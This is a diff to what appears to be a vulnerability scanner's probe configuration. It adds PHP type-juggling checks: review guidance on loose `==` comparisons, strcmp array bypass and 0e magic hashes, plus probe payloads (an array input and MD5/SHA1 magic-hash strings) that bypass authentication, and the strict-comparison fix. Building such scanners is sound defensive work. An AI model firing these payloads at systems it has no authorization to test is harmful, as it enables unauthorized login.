@@ -128,9 +128,9 @@
       ]
     },
     "type_juggling": {
-      "description": "Type confusion/juggling -- exploit loose comparisons by sending unexpected types (array, object, boolean, null)",
+      "description": "Type confusion/juggling -- exploit loose comparisons by sending unexpected types (array, object, boolean, null) or magic-hash collision strings. White-box source-review signals (grep the auth/comparison code): (1) `==` instead of `===` on a password/token/otp/hash compare is the core vulnerable pattern -- `==` triggers PHP type juggling, `===` does not. (2) `strcmp($stored, $_POST['pw'])` where the input can be an array: in legacy PHP (<8.0) strcmp() returns NULL (not false) when given an array argument and only emits a warning; a subsequent loose `strcmp(...) == 0` then evaluates NULL == 0, which is true, so the check is bypassed (send `pw[]=` to force the array argument). PHP 8.0+ raises a TypeError instead, so this is a legacy-code technique. (3) `md5($input) == $stored` / `sha1($input) == $stored` where $stored is a 'magic hash' (hash of the form 0e followed by only digits): PHP's loose `==` reads both 0e-strings as scientific notation 0e... == 0e... -> 0 == 0 -> true, so any input whose hash is also a 0e-magic-hash authenticates. Fix is strict `===` / hash_equals().",
       "tech_match": ["PHP", "Node.js", "JavaScript", "Ruby"],
-      "param_match": ["password", "token", "otp", "code", "pin", "secret"],
+      "param_match": ["password", "token", "otp", "code", "pin", "secret", "hash", "signature", "sig"],
       "probes": [
         {
           "payload": "true",
@@ -144,13 +144,43 @@
         },
         {
           "payload": "[]",
-          "description": "Empty array instead of string -- some frameworks accept arrays and skip validation",
+          "description": "Array instead of string (send param[]= in the request) -- legacy PHP strcmp($stored, $_POST['pw']) returns NULL on an array argument; a loose `strcmp(...) == 0` then treats NULL == 0 as true, bypassing the check (PHP <8.0; 8.0+ raises TypeError instead)",
           "matchers": [
             {"type": "status", "status": [200, 302, 500]},
             {"type": "word", "words": ["array", "type", "unexpected"], "condition": "or"}
           ],
           "severity": "medium",
           "confidence_boost": 35
+        },
+        {
+          "payload": "240610708",
+          "description": "Magic hash (MD5) -- md5('240610708')=0e462097431906509019562988736854; under loose `md5($input) == $stored` where $stored is a 0e-magic hash, both read as 0 and authenticate. Verified real MD5 magic hash.",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "denied"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "QNKCDZO",
+          "description": "Magic hash (MD5) -- md5('QNKCDZO')=0e830400451993494058024219903391; loose `==` treats it as 0, bypassing a magic-hash comparison. Verified real MD5 magic hash.",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "denied"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "aaroZmOk",
+          "description": "Magic hash (SHA1) -- sha1('aaroZmOk')=0e66507019969427134894567494305185566735; loose `sha1($input) == $stored` reads it as 0 and authenticates against any 0e-magic SHA1. Verified real SHA1 magic hash.",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "denied"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
         }
       ]
     },
